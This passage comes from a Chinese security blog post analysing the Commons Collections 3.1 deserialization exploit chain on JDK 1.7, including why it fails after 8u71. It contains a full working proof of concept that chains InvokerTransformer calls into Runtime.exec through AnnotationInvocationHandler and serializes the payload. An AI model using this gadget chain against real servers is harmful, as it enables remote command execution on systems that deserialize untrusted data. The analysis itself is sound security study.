                String var6 = (String)var5.getKey();//获取key的名称
                Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样
                if (var7 != null) {
                    Object var8 = var5.getValue();//获取map的value
                    if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                        //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功
                        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                    }
                }
            }
        }
    }
虽然相对于这个类具体做什么，实在是没有精力去搞清楚了，但是它最终对于我们传入构造函数的map进行遍历赋值。  
这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击。
最终模拟攻击代码
    public static void main(String[] args) throws Exception {
        //1.客户端构建攻击代码
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);
        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class, outerMap);
        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(instance);
        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }
成功  
至此，我们在客户端构造了payload发送至服务端，  
只要服务端
  1. 对我们的输入进行反序列化
  2. jdk版本为1.7
就可以直接完成命令执行，完美！
#### 2020/07/09更新
完美个屁，在先知有同学提出了问题：
> 请问为什么`innerMap.put("value", "value");`我换成`innerMap.put("key",
> "value");`就无法触发，key换成其他值都无法触发，只有“value”可以。
这其实就是当初一个人茫然的学学学，实在坚持不下去，疏忽导致的坑。那么我们回过头来看这个问题。
在我们封装成Map时。就默认使用了`value:value`作为键值对，在那个时候我们把这里改成任意的键值对都是可以成功触发的。
但是一旦我们引入了AnnotationInvocationHandler作为readobject复写点，就再去改动这个值就会执行命令失败。问题肯定处理在AnnotaionInvocationHandler这个过程中。
来DEBUG看当取值`key:value`时，在什么地方出了问题，找到是反序列化时的`sun.reflect.annotation.AnnotationInvocationHandler#readObject`,这边var7，会为空，从而不进入我们的setValue触发命令执行。
来看为什么，重新分析之前囫囵吞枣地AnnotationInvocationHandler的readobject：
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
            //默认反序列化,这里是前半部分代码
            var1.defaultReadObject();
            AnnotationType var2 = null;
            try {
                //这里的this.type是我们在实例化的时候传入的jdk自带的Target.class
                //之前的poc语句是这样Object instance = ctor.newInstance(Target.class, outerMap);
                var2 = AnnotationType.getInstance(this.type);
            } catch (IllegalArgumentException var9) {
                throw new InvalidObjectException("Non-annotation type in annotation serial stream");
            }
`AnnotationType.getInstance(this.type)`是一个关键的有关注解的操作。所以我们需要先来了解一下java的注解。
##### 注解
`Target.class`其实是java提供的的 **元注解**
（因为是注解所以之后写成特有的形式`@Target`）。除此之外还有`@Retention`、`@Documented`、`@Inherited`，所谓元注解就是标记其他注解的注解。
  * @Target 用来约束注解可以应用的地方（如方法、类或字段）
  * @Retention用来约束注解的生命周期，分别有三个值，源码级别（source），类文件级别（class）或者运行时级别（runtime)
  * @Documented 被修饰的注解会生成到javadoc中
  * @Inherited 可以让注解被继承，但这并不是真的继承，只是通过使用@Inherited，可以让子类Class对象使用getAnnotations()获取父类被@Inherited修饰的注解
  * 除此之外注解还可以有注解元素(等同于赋值)。
举个自定义注解的例子：
    @Target(ElementType.TYPE)
    @Retention(RetentionPolicy.RUNTIME)
    public @interface DBTable {
        String name() default "";//default是默认值
    }
它会被这样使用：
    @DBTable(name = "MEMBER")
    public class Member {
    }
由于赋值的时候总是用 `注解元素 = 值`的形式太麻烦了，出现了 `value`
这个偷懒的语法糖。（这也是为什么之前的`@Target(ElementType.TYPE)`不是`注解元素 = 值`的形式）
如果注解元素为 **value** 时，就不需要用`注解元素 = 值`的形式，而是直接写入值就可以赋值为value。
除此之外java还有一些内置注解：
  * @Override：用于标明此方法覆盖了父类的方法
  * @Deprecated：用于标明已经过时的方法或类
  * @SuppressWarnnings:用于有选择的关闭编译器对类、方法、成员变量、变量初始化的警告
回过头来看看`java.lang.annotation.Target`：
    @Documented//会被写入javadoc文档
    @Retention(RetentionPolicy.RUNTIME)//生命周期时运行时
    @Target(ElementType.ANNOTATION_TYPE)//标明注解可以用于注解声明(应用于另一个注解上)
    public @interface Target {
        ElementType[] value();//注解元素，一个特定的value语法糖，可以省点力气
    }
##### 回来
初步了解了java的注解之后，我们回来看`AnnotationType.getInstance(this.type)`对@Target这个注解的处理，不过多的去纠结内部细节，getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。
再来看接下来的var3，var3就是一个注解元素的键值对`value这个注解元素，可以取值Ljava.lang.annotation.ElementType类型的值`
    //后半部分代码
            Map var3 = var2.memberTypes();//{value：ElementType的键值对}
            Iterator var4 = this.memberValues.entrySet().iterator();
            //获取我们构造map的迭代器，无法命令执行的键值对是{key:value}
            while(var4.hasNext()) {
                Entry var5 = (Entry)var4.next();//获取到{key:value}
                String var6 = (String)var5.getKey();//获取键值对的键名key
                Class var7 = (Class)var3.get(var6);
                //从@Target的注解元素键值对{value：ElementType的键值对}中去寻找键名为key的值
                //于是var7为空
                if (var7 != null) {
                    //触发命令执行处
                    }
                }
            }
        }
    }
这样我们就搞懂了为什么赋值map{key：value}就不行，因为通过AnnotationInvocationHandler#readObject，我们需要保证：
  * 我们poc中提供的`this.type`的注解要存在注解元素名（为了满足var3不为空）。
  * 我们poc中提供的`this.memberValues`中存在的一个键值对的键名与`this.type`的注解要存在注解元素名相等。（为了满足var7!=null）
所以我们选取了@Target注解作为`this.type`，我们就必须向`this.memberValues`写入一个`value：xxx`的键值对
这里的`this.type`是可以变动的，比如换成另一个元注释`Retention.class`（虽然他的注解元素名也是value），甚至可以自定义，但是对方服务器上没有这个注释，打别人是没有用的，所以还是选用大家都有的元注释。
同时我们写入的`this.memberValues`的键名不能改变，但是值可以改变。
比如：
现在完美
#### jdk1.8为什么不行呢
其实上面的poc在Java 7的低版本（只测试了7u80，没有具体版本号）、8u71之前都是可以使用的，在Java 8u71之后代码发生了变动。
那么为啥不行呢,看一下jdk8里面的`sun.reflect.annotation.AnnotationInvocationHandler`
readObject复写点：
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
            GetField var2 = var1.readFields();
            Class var3 = (Class)var2.get("type", (Object)null);
            Map var4 = (Map)var2.get("memberValues", (Object)null);
            AnnotationType var5 = null;
            try {
                var5 = AnnotationType.getInstance(var3);
            } catch (IllegalArgumentException var13) {
                throw new InvalidObjectException("Non-annotation type in annotation serial stream");
            }
            Map var6 = var5.memberTypes();
            LinkedHashMap var7 = new LinkedHashMap();
            String var10;
            Object var11;
            for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
                Entry var9 = (Entry)var8.next();
                var10 = (String)var9.getKey();
                var11 = null;
                Class var12 = (Class)var6.get(var10);
                if (var12 != null) {
                    var11 = var9.getValue();
                    if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                        //很伤心的，没有了map赋值语句
                        var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                    }
                }
            }
            //省略不重要...
    }
因为这个函数出现了变动，不再有针对我们构造的map的赋值语句，所以触发不了漏洞。
而是改成了新建一个LinkedHashMap，把值转进这个LinkedHashMap里面。
## 写在后面
至此我们就完成common-collection 3.1版本 jdk1.7版本下的POC复现和利用链分析。  
当然还有common-collection 不同组件版本，不同环境下poc和利用链均有不同，在ysoserial下就有7，8中利用方式。  
还可以通过rmi模式进行利用等。
但是由于这篇博客写的太长了，思路也一直断断续续，其他内容之后再陆续学习分析吧~
## 参考资料
参考资料大多从先知中获取，这里就列举一部分。  
[玩转ysoserial-CommonsCollection的七种利用方式分析](https://mp.weixin.qq.com/s/gZbcdS0TbAetZwVMyjkGWQ)  
Java安全漫谈 - 10.反序列化篇(4)